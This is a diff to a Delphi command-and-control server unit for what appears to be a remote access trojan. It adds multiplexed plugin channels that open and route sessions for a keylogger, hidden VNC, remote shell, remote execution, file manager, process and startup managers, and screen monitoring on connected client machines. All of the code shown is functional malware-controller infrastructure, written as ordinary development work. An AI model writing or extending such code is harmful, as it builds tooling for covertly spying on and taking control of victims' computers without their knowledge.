@@ -98,6 +98,14 @@ type
     LastPongTime : UInt64;
   end;
 
+  TChannelInfo = record
+    ChannelID  : string;
+    PluginID   : string;
+    ClientID   : string;
+    MainLine   : TncLine;
+    ChannelLine: TncLine;
+  end;
+
   TLogCategory = (lcConnection, lcCommand, lcError);
 
   TClientEvent              = procedure(const Info: TClientInfo) of object;
@@ -117,6 +125,9 @@ type
     FServer           : TncTCPServer;
     FLock             : TCriticalSection;
     FClients          : TDictionary<TncLine, TClientInfo>;
+    FChannels         : TDictionary<TncLine, TChannelInfo>;
+    FPendingChannels  : TDictionary<string, Pointer>;
+    FPendingPluginIDs : TDictionary<string, string>;
     FInfoForms        : TDictionary<TncLine, TForm3>;
     FProcessForms     : TDictionary<TncLine, TForm4>;
     FRemoteShellForms : TDictionary<TncLine, TForm5>;
@@ -182,6 +193,7 @@ type
     procedure Start(Port: Integer);
     procedure Stop;
 
+    function OpenPluginChannel(aMainLine: TncLine; const PluginID: string; AForm: TObject): string;
     procedure SendJSON(aLine: TncLine; JSONObj: TJSONObject);
     procedure SendBinaryPacket(aLine: TncLine; PacketType: Byte; const Data: TBytes);
     procedure SendPlugin(aLine: TncLine; const PluginID: string);
@@ -330,6 +342,9 @@ begin
   FLock             := TCriticalSection.Create;
   FSendLocks        := TDictionary<Pointer, TCriticalSection>.Create;
   FClients          := TDictionary<TncLine, TClientInfo>.Create;
+  FChannels         := TDictionary<TncLine, TChannelInfo>.Create;
+  FPendingChannels  := TDictionary<string, Pointer>.Create;
+  FPendingPluginIDs := TDictionary<string, string>.Create;
   FInfoForms        := TDictionary<TncLine, TForm3>.Create;
   FProcessForms     := TDictionary<TncLine, TForm4>.Create;
   FRemoteShellForms := TDictionary<TncLine, TForm5>.Create;
@@ -377,6 +392,9 @@ begin
   FProcessForms.Free;
   FInfoForms.Free;
   FStartupManagerForms.Free;
+  FPendingPluginIDs.Free;
+  FPendingChannels.Free;
+  FChannels.Free;
   FClients.Free;
   for var LSendLock in FSendLocks.Values do
     LSendLock.Free;
@@ -1009,6 +1027,35 @@ begin
   end;
 end;
 
+function TServerManager.OpenPluginChannel(aMainLine: TncLine;
+  const PluginID: string; AForm: TObject): string;
+var
+  ChannelID: string;
+  JSONObj  : TJSONObject;
+begin
+  ChannelID := TGUID.NewGuid.ToString.Replace('{','').Replace('}','').Replace('-','');
+  FLock.Enter;
+  try
+    if Assigned(AForm) then
+      FPendingChannels.AddOrSetValue(ChannelID, Pointer(AForm));
+    FPendingPluginIDs.AddOrSetValue(ChannelID, PluginID);
+  finally
+    FLock.Leave;
+  end;
+
+  JSONObj := TJSONObject.Create;
+  try
+    JSONObj.AddPair('action', 'open_channel');
+    JSONObj.AddPair('plugin_id', PluginID);
+    JSONObj.AddPair('channel_id', ChannelID);
+    SendJSON(aMainLine, JSONObj);
+  finally
+    JSONObj.Free;
+  end;
+
+  Result := ChannelID;
+end;
+
 procedure TServerManager.SendBinaryPacket(aLine: TncLine; PacketType: Byte;
   const Data: TBytes);
 var
@@ -1035,7 +1082,8 @@ begin
   FLock.Enter;
   try
     LIsValid := FClients.TryGetValue(aLine, Info);
-    if LIsValid then IP := Info.IPAddress;
+    if LIsValid then IP := Info.IPAddress
+    else LIsValid := FChannels.ContainsKey(aLine);
   finally
     FLock.Leave;
   end;
@@ -1087,7 +1135,8 @@ begin
       FLock.Enter;
       try
         LIsValid := FClients.TryGetValue(aLine, LInfo);
-        if LIsValid then LIP := LInfo.IPAddress;
+        if LIsValid then LIP := LInfo.IPAddress
+        else LIsValid := FChannels.ContainsKey(aLine);
       finally
         FLock.Leave;
       end;
@@ -1136,10 +1185,10 @@ begin
     Exit;
   end;
 
-  { Verify client still connected }
+  { Verify client or channel still connected }
   FLock.Enter;
   try
-    if not FClients.ContainsKey(aLine) then Exit;
+    if (not FClients.ContainsKey(aLine)) and (not FChannels.ContainsKey(aLine)) then Exit;
   finally
     FLock.Leave;
   end;
@@ -1261,6 +1310,8 @@ procedure TServerManager.OnDisconnected(Sender: TObject; aLine: TncLine);
 var
   IP             : string;
   Info           : TClientInfo;
+  ChInfo         : TChannelInfo;
+  IsChannel      : Boolean;
   ProcessForm    : TForm4;
   ShellForm      : TForm5;
   MonitoringForm : TForm6;
@@ -1273,6 +1324,65 @@ var
   CapturedLine   : TncLine;
   CB             : TClientRemoveEvent;
 begin
+  IsChannel := False;
+  FLock.Enter;
+  try
+    IsChannel := FChannels.TryGetValue(aLine, ChInfo);
+    if IsChannel then
+    begin
+      FChannels.Remove(aLine);
+      FReadBuffers.Remove(aLine);
+    end;
+  finally
+    FLock.Leave;
+  end;
+
+  if IsChannel then
+  begin
+    DoLog(lcConnection, 'Plugin channel [' + ChInfo.PluginID + '] disconnected');
+    FLock.Enter;
+    try
+      if FProcessForms.TryGetValue(aLine, ProcessForm) and Assigned(ProcessForm) then
+        ProcessForm.DetachCallbacks;
+      FProcessForms.Remove(aLine);
+
+      if FRemoteShellForms.TryGetValue(aLine, ShellForm) and Assigned(ShellForm) then
+        ShellForm.DetachCallbacks;
+      FRemoteShellForms.Remove(aLine);
+
+      if FMonitoringForms.TryGetValue(aLine, MonitoringForm) and Assigned(MonitoringForm) then
+        MonitoringForm.DetachCallbacks;
+      FMonitoringForms.Remove(aLine);
+
+      if FKeyloggerForms.TryGetValue(aLine, KeyloggerForm) and Assigned(KeyloggerForm) then
+        KeyloggerForm.DetachCallbacks;
+      FKeyloggerForms.Remove(aLine);
+
+      if FOpenURLForms.TryGetValue(aLine, OpenURLForm) and Assigned(OpenURLForm) then
+        OpenURLForm.DetachCallbacks;
+      FOpenURLForms.Remove(aLine);
+
+      if FFileManagerForms.TryGetValue(aLine, FileManagerForm) and Assigned(FileManagerForm) then
+        FileManagerForm.DetachCallbacks;
+      FFileManagerForms.Remove(aLine);
+
+      if FHiddenVNCForms.TryGetValue(aLine, HiddenVNCForm) and Assigned(HiddenVNCForm) then
+        HiddenVNCForm.DetachCallbacks;
+      FHiddenVNCForms.Remove(aLine);
+
+      if FRemoteExecutionForms.TryGetValue(aLine, RemoteExecutionForm) and Assigned(RemoteExecutionForm) then
+        RemoteExecutionForm.DetachCallbacks;
+      FRemoteExecutionForms.Remove(aLine);
+
+      if FStartupManagerForms.TryGetValue(aLine, StartupManagerForm) and Assigned(StartupManagerForm) then
+        StartupManagerForm.DetachCallbacks;
+      FStartupManagerForms.Remove(aLine);
+    finally
+      FLock.Leave;
+    end;
+    Exit;
+  end;
+
   IP := aLine.PeerIP;
 
   FLock.Enter;
@@ -1741,6 +1851,140 @@ begin
     IP := '';
     if TryGetClientInfo(aLine, Info) then
       IP := Info.IPAddress;
+
+    { ---- Channel Init ---- }
+    if Action = 'channel_init' then
+    begin
+      var ChannelID := '';
+      var PluginID  := '';
+      var ClientID  := '';
+      if Assigned(JSONObj.Values['channel_id']) then ChannelID := JSONObj.Values['channel_id'].Value;
+      if Assigned(JSONObj.Values['plugin_id'])  then PluginID  := JSONObj.Values['plugin_id'].Value;
+      if Assigned(JSONObj.Values['client_id'])  then ClientID  := JSONObj.Values['client_id'].Value;
+
+      var PendingForm: Pointer := nil;
+      var ChInfo: TChannelInfo;
+      FLock.Enter;
+      try
+        ChInfo.ChannelID   := ChannelID;
+        ChInfo.PluginID    := PluginID;
+        ChInfo.ClientID    := ClientID;
+        ChInfo.MainLine    := nil;
+        ChInfo.ChannelLine := aLine;
+
+        for var CIn in FClients.Values do
+        begin
+          if SameText(CIn.ID, ClientID) then
+          begin
+            ChInfo.MainLine := CIn.LineHandle;
+            Break;
+          end;
+        end;
+
+        FChannels.AddOrSetValue(aLine, ChInfo);
+
+        if (ChannelID <> '') and FPendingChannels.TryGetValue(ChannelID, PendingForm) then
+        begin
+          FPendingChannels.Remove(ChannelID);
+          FPendingPluginIDs.Remove(ChannelID);
+        end;
+      finally
+        FLock.Leave;
+      end;
+
+      if Assigned(PendingForm) then
+      begin
+        if SameText(PluginID, FILE_MANAGER_PLUGIN_ID) then
+        begin
+          RegisterFileManagerForm(aLine, TForm9(PendingForm));
+          var FMForm := TForm9(PendingForm);
+          QueueToUI(procedure
+          begin
+            FMForm.SetupForClient(aLine, ClientID, SendJSON, SendBinaryPacket, UnregisterFileManagerForm);
+            FMForm.RequestDrives;
+          end);
+        end
+        else if SameText(PluginID, PROCESS_MANAGER_PLUGIN_ID) then
+        begin
+          RegisterProcessForm(aLine, TForm4(PendingForm));
+          var ProcForm := TForm4(PendingForm);
+          QueueToUI(procedure
+          begin
+            ProcForm.SetupForClient(aLine, ClientID, SendJSON, UnregisterProcessForm);
+            ProcForm.RequestProcesses;
+          end);
+        end
+        else if SameText(PluginID, REMOTE_SHELL_PLUGIN_ID) then
+        begin
+          RegisterRemoteShellForm(aLine, TForm5(PendingForm));
+          var ShellForm := TForm5(PendingForm);
+          QueueToUI(procedure
+          begin
+            ShellForm.SetupForClient(aLine, ClientID, SendJSON, UnregisterRemoteShellForm);
+            ShellForm.RequestShellStart;
+          end);
+        end
+        else if SameText(PluginID, REMOTE_MONITORING_PLUGIN_ID) then
+        begin
+          RegisterMonitoringForm(aLine, TForm6(PendingForm));
+          var MonForm := TForm6(PendingForm);
+          QueueToUI(procedure
+          begin
+            MonForm.SetupForClient(aLine, ClientID, SendJSON, UnregisterMonitoringForm);
+            MonForm.RequestMonitorList;
+          end);
+        end
+        else if SameText(PluginID, KEYLOGGER_PLUGIN_ID) then
+        begin
+          RegisterKeyloggerForm(aLine, TForm7(PendingForm));
+          var KeyLogForm := TForm7(PendingForm);
+          QueueToUI(procedure
+          begin
+            KeyLogForm.SetupForClient(aLine, ClientID, SendJSON, UnregisterKeyloggerForm);
+          end);
+        end
+        else if SameText(PluginID, OPEN_URL_PLUGIN_ID) then
+        begin
+          RegisterOpenURLForm(aLine, TForm8(PendingForm));
+          var URLForm := TForm8(PendingForm);
+          QueueToUI(procedure
+          begin
+            URLForm.SetupForClient(aLine, ClientID, SendJSON, UnregisterOpenURLForm);
+          end);
+        end
+        else if SameText(PluginID, HIDDEN_VNC_PLUGIN_ID) then
+        begin
+          RegisterHiddenVNCForm(aLine, TForm10(PendingForm));
+          var VNCForm := TForm10(PendingForm);
+          QueueToUI(procedure
+          begin
+            VNCForm.SetupForClient(aLine, ClientID, SendJSON, UnregisterHiddenVNCForm);
+          end);
+        end
+        else if SameText(PluginID, REMOTE_EXECUTION_PLUGIN_ID) then
+        begin
+          RegisterRemoteExecutionForm(aLine, TForm11(PendingForm));
+          var ExecForm := TForm11(PendingForm);
+          QueueToUI(procedure
+          begin
+            ExecForm.SetupForClient(aLine, ClientID, SendJSON, UnregisterRemoteExecutionForm);
+          end);
+        end
+        else if SameText(PluginID, STARTUP_MANAGER_PLUGIN_ID) then
+        begin
+          RegisterStartupManagerForm(aLine, TForm12(PendingForm));
+          var StartupForm := TForm12(PendingForm);
+          QueueToUI(procedure
+          begin
+            StartupForm.SetupForClient(aLine, ClientID, SendJSON, UnregisterStartupManagerForm);
+            StartupForm.RequestStartupList;
+          end);
+        end;
+      end;
+
+      DoLog(lcConnection, 'Plugin channel [' + PluginID + '] connected for client: ' + ClientID);
+      Exit;
+    end;
 
     { ---- Pong ---- }
     if Action = 'pong' then
